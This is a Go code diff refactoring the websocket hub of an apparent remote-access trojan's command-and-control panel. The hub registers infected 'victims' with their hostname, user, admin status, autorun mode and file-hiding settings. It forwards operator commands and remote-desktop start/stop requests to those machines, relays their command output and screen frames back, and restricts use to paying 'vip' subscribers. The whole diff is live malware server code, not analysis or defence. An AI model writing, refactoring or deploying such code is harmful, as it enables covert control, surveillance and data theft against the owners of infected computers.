@@ -2,7 +2,6 @@ package ws
 
 import (
 	"encoding/json"
-	"log"
 	"net/http"
 	"strings"
 	"sync"
@@ -16,14 +15,14 @@ import (
 type Hub struct {
 	db *storage.DB
 
-	mu               sync.RWMutex
-	victims           map[string]*storage.Victim
-	clients           map[*websocket.Conn]bool
-	clientOwners      map[*websocket.Conn]string
-	victimSockets     map[string]*websocket.Conn
+	mu                 sync.RWMutex
+	victims            map[string]*storage.Victim
+	clients            map[*websocket.Conn]bool
+	clientOwners       map[*websocket.Conn]string
+	victimSockets      map[string]*websocket.Conn
 	victimOwnersByConn map[*websocket.Conn]string
-	bannedVictimIDs   map[string]bool
-	hiddenVictimIDs   map[string]map[string]bool
+	bannedVictimIDs    map[string]bool
+	hiddenVictimIDs    map[string]map[string]bool
 
 	connMu    sync.Mutex
 	connWrite map[*websocket.Conn]*sync.Mutex
@@ -35,7 +34,7 @@ type Hub struct {
 
 func NewHub(db *storage.DB) (*Hub, error) {
 	h := &Hub{
-		db:                db,
+		db:                 db,
 		victims:            make(map[string]*storage.Victim),
 		clients:            make(map[*websocket.Conn]bool),
 		clientOwners:       make(map[*websocket.Conn]string),
@@ -90,74 +89,6 @@ func NewHub(db *storage.DB) (*Hub, error) {
 
 	h.startCleanup()
 	return h, nil
-}
-
-func (h *Hub) getConnMutex(c *websocket.Conn) *sync.Mutex {
-	if c == nil {
-		m := &sync.Mutex{}
-		return m
-	}
-	h.connMu.Lock()
-	defer h.connMu.Unlock()
-	m := h.connWrite[c]
-	if m != nil {
-		return m
-	}
-	m = &sync.Mutex{}
-	h.connWrite[c] = m
-	return m
-}
-
-func (h *Hub) broadcastVictims() {
-	h.mu.RLock()
-	clients := make([]*websocket.Conn, 0, len(h.clients))
-	owners := make([]string, 0, len(h.clients))
-	for c := range h.clients {
-		clients = append(clients, c)
-		owners = append(owners, strings.TrimSpace(h.clientOwners[c]))
-	}
-	h.mu.RUnlock()
-
-	if len(clients) == 0 {
-		return
-	}
-
-	for i, c := range clients {
-		owner := strings.ToLower(strings.TrimSpace(owners[i]))
-		h.mu.RLock()
-		list := make([]*storage.Victim, 0, len(h.victims))
-		hidden := h.hiddenVictimIDs[owner]
-		for _, v := range h.victims {
-			if owner != "" && strings.ToLower(strings.TrimSpace(v.Owner)) != owner {
-				continue
-			}
-			if hidden != nil {
-				if hidden[strings.TrimSpace(v.ID)] {
-					continue
-				}
-			}
-			vv := *v
-			list = append(list, &vv)
-		}
-		h.mu.RUnlock()
-
-		payload := map[string]any{
-			"type":    "victims",
-			"victims": list,
-		}
-		data, err := json.Marshal(payload)
-		if err != nil {
-			continue
-		}
-
-		m := h.getConnMutex(c)
-		m.Lock()
-		_ = c.SetWriteDeadline(time.Now().Add(15 * time.Second))
-		if err := c.WriteMessage(websocket.TextMessage, data); err != nil {
-			log.Println("broadcastVictims write:", err)
-		}
-		m.Unlock()
-	}
 }
 
 func (h *Hub) HandleHTTP(w http.ResponseWriter, r *http.Request) {
@@ -219,33 +150,7 @@ func (h *Hub) HandleHTTP(w http.ResponseWriter, r *http.Request) {
 
 	associatedVictimID := ""
 
-	go func() {
-		t := time.NewTicker(25 * time.Second)
-		defer t.Stop()
-		for {
-			select {
-			case <-stopPing:
-				return
-			case <-t.C:
-				if panelLogin != "" && h.db != nil {
-					status, _, _, err := h.db.GetSubscription(panelLogin)
-					if err != nil || status != "vip" {
-						_ = ws.Close()
-						return
-					}
-				}
-				m := h.getConnMutex(ws)
-				m.Lock()
-				_ = ws.SetWriteDeadline(time.Now().Add(15 * time.Second))
-				err := ws.WriteControl(websocket.PingMessage, []byte("ping"), time.Now().Add(15*time.Second))
-				m.Unlock()
-				if err != nil {
-					_ = ws.Close()
-					return
-				}
-			}
-		}
-	}()
+	go h.pingLoop(ws, panelLogin, stopPing)
 
 	if panelLogin != "" {
 		h.mu.Lock()
@@ -276,274 +181,60 @@ func (h *Hub) HandleHTTP(w http.ResponseWriter, r *http.Request) {
 			continue
 		}
 
-		typeVal := strFrom(payload["type"])
-		switch typeVal {
+		switch strFrom(payload["type"]) {
 		case "register":
-			id := strFrom(payload["id"])
-			if id == "" {
-				continue
-			}
-			if strings.TrimSpace(token) == "" || strings.TrimSpace(ownerLogin) == "" {
-				_ = ws.Close()
-				continue
-			}
-
-			h.mu.RLock()
-			banned := h.bannedVictimIDs[id]
-			h.mu.RUnlock()
-			if h.db != nil {
-				if ok, err := h.db.IsVictimBanned(id); err == nil {
-					if ok {
-						banned = true
-						h.mu.Lock()
-						h.bannedVictimIDs[id] = true
-						h.mu.Unlock()
-					} else if banned {
-						h.mu.Lock()
-						delete(h.bannedVictimIDs, id)
-						h.mu.Unlock()
-						banned = false
-					}
+			if id := h.handleRegister(ws, payload, ownerLogin, token, ip); id != "" {
+				associatedVictimID = id
+				ownerLogin = strings.ToLower(strings.TrimSpace(strFrom(payload["owner"])))
+				if ownerLogin == "" {
+					ownerLogin = strings.ToLower(strings.TrimSpace(ownerLogin))
 				}
 			}
-			if banned {
-				_ = ws.Close()
-				continue
-			}
-
-			resolvedOwner := strings.TrimSpace(ownerLogin)
-			if resolvedOwner == "" {
-				resolvedOwner = strings.ToLower(strings.TrimSpace(strFrom(payload["owner"])))
-			}
-			if resolvedOwner == "" {
-				_ = ws.Close()
-				continue
-			}
-			if h.db != nil {
-				status, _, _, err := h.db.GetSubscription(resolvedOwner)
-				if err != nil || status != "vip" {
-					_ = ws.Close()
-					continue
-				}
-			}
-			ownerLogin = resolvedOwner
-
-			if !h.lim.allowRegister(ownerLogin, ip) {
-				m := h.getConnMutex(ws)
-				m.Lock()
-				_ = ws.SetWriteDeadline(time.Now().Add(2 * time.Second))
-				_ = ws.WriteControl(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.ClosePolicyViolation, "rate limit"), time.Now().Add(2*time.Second))
-				m.Unlock()
-				_ = ws.Close()
-				continue
-			}
-
-			v := &storage.Victim{
-				ID:           id,
-				Hostname:     strFrom(payload["hostname"]),
-				User:         strFrom(payload["user"]),
-				IP:           strFrom(payload["ip"]),
-				Comment:      strFrom(payload["comment"]),
-				BuildID:      strFrom(payload["buildId"]),
-				OS:           strFrom(payload["os"]),
-				CPU:          strFrom(payload["cpu"]),
-				GPU:          strFrom(payload["gpu"]),
-				RAM:          strFrom(payload["ram"]),
-				Country:      strFrom(payload["country"]),
-				DeviceType:   strFrom(payload["deviceType"]),
-				Admin:        boolFrom(payload["admin"]),
-				Owner:        ownerLogin,
-				LastActive:   time.Now(),
-				Online:       true,
-				BuildVersion: strFrom(payload["version"]),
-				AutorunMode:  strFrom(payload["autorunMode"]),
-				InstallPath:  strFrom(payload["installPath"]),
-				HideFilesEnabled: boolFrom(payload["hideFilesEnabled"]),
-			}
-			if delayVal, ok := payload["startupDelaySeconds"]; ok {
-				if f, ok2 := delayVal.(float64); ok2 {
-					v.StartupDelaySeconds = int(f)
-				}
-			}
-
-			associatedVictimID = id
-
-			if h.db != nil {
-				_ = h.db.UpsertVictim(v)
-			}
-
-			h.mu.Lock()
-			h.victims[id] = v
-			h.victimSockets[id] = ws
-			h.victimOwnersByConn[ws] = strings.ToLower(strings.TrimSpace(v.Owner))
-			h.mu.Unlock()
-
-			h.broadcastVictims()
-
 		case "update":
-			id := strFrom(payload["id"])
-			if id == "" {
-				continue
-			}
-			windowTitle := strFrom(payload["window"])
-
-			var victimCopy *storage.Victim
-			h.mu.Lock()
-			if v, ok := h.victims[id]; ok {
-				v.Window = windowTitle
-				v.LastActive = time.Now()
-				v.Online = true
-				vv := *v
-				victimCopy = &vv
-			}
-			h.mu.Unlock()
-
-			if victimCopy != nil && h.db != nil {
-				now := time.Now()
-				if h.lim.shouldPersist(id, now) {
-					_ = h.db.UpsertVictim(victimCopy)
-				}
-			}
-
-			h.broadcastVictims()
-
+			h.handleUpdate(payload)
 		case "ping":
-			var victimCopy *storage.Victim
-			pingVictimID := ""
-			h.mu.Lock()
-			if associatedVictimID != "" {
-				if v, ok := h.victims[associatedVictimID]; ok {
-					if h.victimSockets[associatedVictimID] == ws {
-						now := time.Now()
-						v.LastActive = now
-						v.Online = true
-						vv := *v
-						victimCopy = &vv
-						pingVictimID = associatedVictimID
-					}
-				}
-			}
-			if victimCopy == nil {
-				for id, c := range h.victimSockets {
-					if c == ws {
-						if v, ok := h.victims[id]; ok {
-							now := time.Now()
-							v.LastActive = now
-							v.Online = true
-							vv := *v
-							victimCopy = &vv
-							pingVictimID = id
-							break
-						}
-					}
-				}
-			}
-			h.mu.Unlock()
-
-			if victimCopy != nil && h.db != nil {
-				now := time.Now()
-				if h.lim.shouldPersist(pingVictimID, now) {
-					_ = h.db.UpsertVictim(victimCopy)
-				}
-			}
-
+			h.handlePing(ws, associatedVictimID)
 		case "command", "rd_start", "rd_stop":
-			if panelLogin == "" {
-				continue
-			}
-			if h.db != nil {
-				status, _, _, err := h.db.GetSubscription(panelLogin)
-				if err != nil || status != "vip" {
-					_ = ws.Close()
-					break
-				}
-			}
-			victimID := strFrom(payload["victim_id"])
-			if victimID == "" {
-				continue
-			}
-
-			h.mu.RLock()
-			v := h.victims[victimID]
-			h.mu.RUnlock()
-			if v == nil || strings.ToLower(strings.TrimSpace(v.Owner)) != strings.ToLower(strings.TrimSpace(panelLogin)) {
-				continue
-			}
-
-			h.mu.RLock()
-			victimConn := h.victimSockets[victimID]
-			h.mu.RUnlock()
-			if victimConn == nil {
-				continue
-			}
-
-			b, err := json.Marshal(payload)
-			if err != nil {
-				continue
-			}
-			m := h.getConnMutex(victimConn)
-			m.Lock()
-			_ = victimConn.SetWriteDeadline(time.Now().Add(15 * time.Second))
-			_ = victimConn.WriteMessage(websocket.TextMessage, b)
-			m.Unlock()
-
+			h.handleCommand(ws, payload, panelLogin)
 		case "cmd_output":
-			b, err := json.Marshal(payload)
-			if err != nil {
-				continue
-			}
-			h.mu.RLock()
-			for clientConn := range h.clients {
-				owner := strings.ToLower(strings.TrimSpace(h.clientOwners[clientConn]))
-				victOwner := strings.ToLower(strings.TrimSpace(h.victimOwnersByConn[ws]))
-				if owner == "" || owner != victOwner {
-					continue
-				}
-				m := h.getConnMutex(clientConn)
-				m.Lock()
-				_ = clientConn.SetWriteDeadline(time.Now().Add(15 * time.Second))
-				_ = clientConn.WriteMessage(websocket.TextMessage, b)
-				m.Unlock()
-			}
-			h.mu.RUnlock()
-
+			h.handleCmdOutput(ws, payload)
 		case "rd_frame":
-			victID := associatedVictimID
-			if victID == "" {
-				h.mu.RLock()
-				for id, c := range h.victimSockets {
-					if c == ws {
-						victID = id
-						break
-					}
-				}
-				h.mu.RUnlock()
-			}
-			if victID == "" {
-				continue
-			}
-			payload["victim_id"] = victID
-			b, err := json.Marshal(payload)
-			if err != nil {
-				continue
-			}
-			h.mu.RLock()
-			for clientConn := range h.clients {
-				owner := strings.ToLower(strings.TrimSpace(h.clientOwners[clientConn]))
-				victOwner := strings.ToLower(strings.TrimSpace(h.victimOwnersByConn[ws]))
-				if owner == "" || owner != victOwner {
-					continue
-				}
-				m := h.getConnMutex(clientConn)
-				m.Lock()
-				_ = clientConn.SetWriteDeadline(time.Now().Add(15 * time.Second))
-				_ = clientConn.WriteMessage(websocket.TextMessage, b)
-				m.Unlock()
-			}
-			h.mu.RUnlock()
+			h.handleRDFrame(ws, payload, associatedVictimID)
 		}
 	}
 
+	h.disconnectConn(ws)
+}
+
+func (h *Hub) pingLoop(ws *websocket.Conn, panelLogin string, stop <-chan struct{}) {
+	t := time.NewTicker(25 * time.Second)
+	defer t.Stop()
+	for {
+		select {
+		case <-stop:
+			return
+		case <-t.C:
+			if panelLogin != "" && h.db != nil {
+				status, _, _, err := h.db.GetSubscription(panelLogin)
+				if err != nil || status != "vip" {
+					_ = ws.Close()
+					return
+				}
+			}
+			m := h.getConnMutex(ws)
+			m.Lock()
+			_ = ws.SetWriteDeadline(time.Now().Add(15 * time.Second))
+			err := ws.WriteControl(websocket.PingMessage, []byte("ping"), time.Now().Add(15*time.Second))
+			m.Unlock()
+			if err != nil {
+				_ = ws.Close()
+				return
+			}
+		}
+	}
+}
+
+func (h *Hub) disconnectConn(ws *websocket.Conn) {
 	h.mu.Lock()
 	delete(h.clients, ws)
 	delete(h.clientOwners, ws)
@@ -562,6 +253,8 @@ func (h *Hub) HandleHTTP(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 	h.mu.Unlock()
+
+	h.removeConn(ws)
 
 	for _, v := range toOffline {
 		if h.db != nil {
